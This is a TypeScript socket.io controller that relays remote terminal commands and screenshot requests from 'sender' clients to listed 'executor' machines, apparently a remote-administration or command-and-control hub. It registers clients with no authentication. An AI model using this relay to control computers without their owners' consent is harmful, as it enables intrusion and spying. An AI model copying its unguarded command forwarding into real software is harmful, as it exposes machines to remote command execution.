import { inject, injectable } from 'inversify';
import { Socket } from 'socket.io';
import { OnConnect, OnDisconnect, Channel } from '../framework/express/hotspring/annotations/methods/httpMethode';
import ClientManagerService from '../service/ClientManagerService';

@injectable()
export default class BridgeController {
  private readonly _clientManagerService: ClientManagerService;

  constructor(@inject(ClientManagerService) clientManagerService: ClientManagerService) { 
    this._clientManagerService = clientManagerService;
  }

  @OnConnect()
  public async clientConnected(socket: Socket): Promise<void> {
    console.log('connected client', socket.id)
    socket.emit('connected', { message: `Bienvenue ${socket.id}` });
  }

  @OnDisconnect()
  public async clientDisconnected(socket: Socket): Promise<void> {
    console.log(`Utilisateur déconnecté: ${socket.id}`);
    await this._clientManagerService.removeClient(socket.id); 
  }

  @Channel('system:register')
  public async handleRegisterClient(socket: Socket, data: any): Promise<void> {
    console.log(data)
    if(ClientManagerService.TYPE_CLIENT.EXEC === data.type || 
      ClientManagerService.TYPE_CLIENT.SENDER === data.type){
      await this._clientManagerService.setClient(socket.id, socket, data);
    }else{
      socket.disconnect(true)
    }
  }

  @Channel('system:computer-listing')
  public async handleComputerList(socket: Socket, data: any): Promise<void> {
    const executorInfo = this._clientManagerService.getAllExecutor();
    socket.emit('system:computer-listing', executorInfo);
  }

  @Channel('open:term')
  public async handleOpenTerminal(socket: Socket, id: string): Promise<void> {
    const socketID = this._clientManagerService.findById(id);
    if(socketID){
      socket.to(socketID).emit('term:run')
    }
  }

  @Channel('exec:command')
  public async handleExecCommand(socket: Socket, data: { id: string , command: string }): Promise<void> {
    const socketID = this._clientManagerService.findById(data.id);
    if(socketID){
      console.log('command send')
      socket.to(socketID).emit('term:input',data)
    }else {
      socket.emit('term:error','The target is inaccessible')
    }
  }

  @Channel('screen:take')
  public async handleExecScreenShoot(socket: Socket, data: { id: string }): Promise<void> {
    const socketID = this._clientManagerService.findById(data.id);
    if(socketID){
      socket.to(socketID).emit('screen:take')
    }else {
      socket.emit('term:error','The target is inaccessible')
    }
  }

}
